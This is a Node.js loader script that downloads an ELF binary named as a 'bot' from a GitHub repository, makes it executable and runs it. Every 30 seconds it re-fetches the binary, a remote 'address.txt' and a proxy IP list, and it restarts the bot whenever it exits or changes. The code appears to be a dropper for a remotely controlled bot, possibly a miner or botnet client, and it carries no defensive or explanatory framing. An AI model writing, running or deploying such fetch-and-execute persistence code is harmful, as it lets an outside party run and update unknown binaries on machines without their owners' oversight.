const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const OWNER = 'malasahjagotwin';
const REPO = 'cgo';
const BASES = [
  `https://raw.githubusercontent.com/${OWNER}/${REPO}/main`,
  `https://github.com/${OWNER}/${REPO}/raw/refs/heads/main`,
];
const SYNC_MS = 30000;

function request(url, redirects) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https:') ? https : http;
    const req = mod.get(url, { headers: { 'User-Agent': 'node' } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && redirects < 5) {
        res.resume();
        resolve(request(new URL(res.headers.location, url).toString(), redirects + 1));
        return;
      }
      if (res.statusCode !== 200) {
        res.resume();
        resolve({ status: res.statusCode, buffer: null });
        return;
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: 200, buffer: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('timeout')));
  });
}

async function fetchBuffer(rel) {
  for (const base of BASES) {
    try {
      const { status, buffer } = await request(`${base}/${rel}?cb=${Date.now()}`, 0);
      if (status === 200 && buffer && buffer.length > 0) {
        return buffer;
      }
    } catch {}
  }
  return null;
}

function isElf(buf) {
  return buf && buf.length >= 20 &&
    buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46 &&
    buf.readUInt16LE(18) === 62;
}

async function writeIfChanged(dest, buf) {
  let cur = null;
  try {
    cur = await fs.promises.readFile(dest);
  } catch {}
  if (cur && cur.equals(buf)) {
    return false;
  }
  const tmp = dest + '.tmp';
  await fs.promises.writeFile(tmp, buf);
  await fs.promises.rename(tmp, dest);
  return true;
}

let proc = null;

function startBot() {
  const botPath = path.join(__dirname, 'c');
  const st = fs.statSync(botPath);
  if ((st.mode & 0o111) === 0) {
    fs.chmodSync(botPath, 0o755);
  }
  proc = spawn(botPath, [], {
    stdio: 'inherit',
    cwd: __dirname,
  });
  proc.on('exit', (code) => {
    console.log(`bot exited with code ${code}, restarting`);
    setTimeout(startBot, 2000);
  });
  proc.on('error', (err) => {
    console.error(`spawn failed: ${err.message}, restarting`);
    setTimeout(startBot, 2000);
  });
}

function restartBot(reason) {
  if (proc) {
    proc.kill();
  }
}

async function syncAll() {
  const addr = await fetchBuffer('abots/address.txt');
  if (addr) {
    const changed = await writeIfChanged(path.join(__dirname, 'address.txt'), addr);
    if (changed) {
      console.log(`address updated to ${addr.toString().trim()}`);
      restartBot('address');
    }
  }
  const ips = await fetchBuffer('abots/c/proxy/ips.txt');
  if (ips) {
    const changed = await writeIfChanged(path.join(__dirname, 'ips.txt'), ips);
    if (changed) {
      console.log('proxies updated');
    }
  }
  const bin = await fetchBuffer('abots/c/c');
  if (bin && isElf(bin)) {
    const changed = await writeIfChanged(path.join(__dirname, 'c'), bin);
    if (changed) {
      console.log(`bot binary updated (${bin.length} bytes)`);
      restartBot('binary');
    }
  }
}

async function main() {
  console.log('bots setup: fetching bot binary from GitHub');
  const bin = await fetchBuffer('abots/c/c');
  if (!bin || !isElf(bin)) {
    console.error('failed to download a valid bot binary');
    process.exit(1);
  }
  const botPath = path.join(__dirname, 'c');
  const tmp = botPath + '.tmp';
  await fs.promises.writeFile(tmp, bin);
  await fs.promises.chmod(tmp, 0o755);
  await fs.promises.rename(tmp, botPath);
  console.log(`downloaded bot binary (${bin.length} bytes)`);
  await syncAll();
  startBot();
  setInterval(syncAll, SYNC_MS);
}

main();